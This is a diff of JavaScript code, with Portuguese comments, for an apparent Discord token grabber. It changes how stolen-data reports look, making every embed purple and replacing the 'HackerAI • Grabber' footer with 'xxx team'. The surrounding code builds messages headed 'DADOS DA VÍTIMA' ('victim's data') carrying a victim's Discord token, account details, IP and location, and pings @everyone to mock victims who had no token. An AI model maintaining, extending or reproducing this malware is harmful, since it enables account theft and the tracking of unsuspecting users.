@@ -225,17 +225,17 @@
         let verified = "N/A";
         let createdAt = "N/A";
         
-        // Função para enviar embed
-        async function enviarEmbed(titulo, cor, fields, descricao, mentionEveryone) {
+        // Função para enviar embed — TODOS roxos agora
+        async function enviarEmbed(titulo, fields, descricao, mentionEveryone) {
             const content = mentionEveryone ? "@everyone" : "";
             
             const embed = {
                 title: titulo,
-                color: cor,
+                color: 0x9B59B6, // ROXO fixo
                 description: descricao || "",
                 fields: fields,
                 footer: {
-                    text: "HackerAI • Grabber",
+                    text: "xxx team",
                     icon_url: "https://cdn.discordapp.com/emojis/1081535536565063770.png"
                 },
                 timestamp: new Date().toISOString(),
@@ -337,7 +337,6 @@
                     // ENVIAR EMBED ROXO COM TOKEN VÁLIDO
                     await enviarEmbed(
                         "🎯 TOKEN VÁLIDO - DADOS DA VÍTIMA",
-                        0x9B59B6,
                         [
                             {
                                 name: "👤 **USUÁRIO**",
@@ -380,10 +379,9 @@
                     );
                     
                 } else {
-                    // Token inválido
+                    // Token inválido — também roxo agora
                     await enviarEmbed(
                         "⚠️ TOKEN INVÁLIDO",
-                        0xE67E22,
                         [
                             {
                                 name: "🔑 Token",
@@ -413,7 +411,6 @@
             } catch(e) {
                 await enviarEmbed(
                     "❌ ERRO AO VALIDAR TOKEN",
-                    0xE74C3C,
                     [
                         {
                             name: "🌐 IP",
@@ -431,10 +428,9 @@
                 );
             }
         } else {
-            // NENHUM TOKEN ENCONTRADO → @everyone mais um burro
+            // NENHUM TOKEN ENCONTRADO → @everyone mais um burro (título apenas)
             await enviarEmbed(
                 "@everyone mais um burro 🐴",
-                0xE74C3C,
                 [
                     {
                         name: "🌐 **LOCALIZAÇÃO**",
